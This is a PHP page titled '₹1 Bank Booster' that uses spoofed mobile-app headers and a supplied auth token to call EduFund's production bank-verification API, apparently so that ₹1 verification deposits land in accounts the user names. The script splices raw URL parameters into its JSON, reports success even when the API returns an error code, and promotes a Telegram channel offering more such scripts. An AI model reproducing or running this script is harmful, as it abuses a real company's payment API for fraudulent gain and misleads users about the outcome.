<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://kit.fontawesome.com/3ea3574147.js" crossorigin="anonymous"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <title>Technical Paisa</title>
   <link rel="stylesheet" href="bhai.css">
</head>
<body>
   <div class="content">
      <h1>₹1 Bank Booster</h1><br>
<center>

<?php
error_reporting(0);
$bank=$_GET['bank'];
$ifsc=$_GET['ifsc'];
$token=$_GET['token'];
$data='{"bankInfo":{"accountNumber":"'.$bank.'","accountHolderName":"FSDIIF","ifscCode":"'.$ifsc.'"}}';
$reshead[]='Host: prod.api.edufund.in';
$reshead[]='accept: application/json, text/plain, */* ';
$reshead[]='user-agent: Android/9 ';
$reshead[]='Edufund-Auth-Token: '.$token.'';
$reshead[]='App-Device-Id: SM8250-AB';
$reshead[]='App-Device-Manufacturer: Asus';
$reshead[]='App-Device-Model: ASUS_I003DD';
$reshead[]='';
$reshead[]='Edufund-Version: 6.3.1';
$reshead[]='build-number: 656 ';
$reshead[]='content-type: application/json;charset=utf-8 ';
$reshead[]='';
$reshead[]='Content-Length: '.strlen($data).'';
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,'https://prod.api.edufund.in/mf/file/verifyBankAccount');
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_HTTPHEADER,$reshead);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,true);
$output=curl_exec($ch);
$json=json_decode($output,true);
$msg=$json['statusCode'];
if($msg=='400'){
   echo"<div class='success'>Amount sent successfully.</div>";
echo"<meta http-equiv='refresh' content='1;url=tg://resolve?domain=technical_paisa_xyz'>";
}else{
   echo"<div class='error'>something went wrong</div>";
echo"<meta http-equiv='refresh' content='1;url=tg://resolve?domain=technical_paisa_xyz'>";
}

?>
<a href="https://telegram.dog/technical_paisa_xyz" class="telBtn shine">
         <i class="fa-regular fa-paper-plane"></i>
         <span>Join telegram channel for more script</span>
      </a>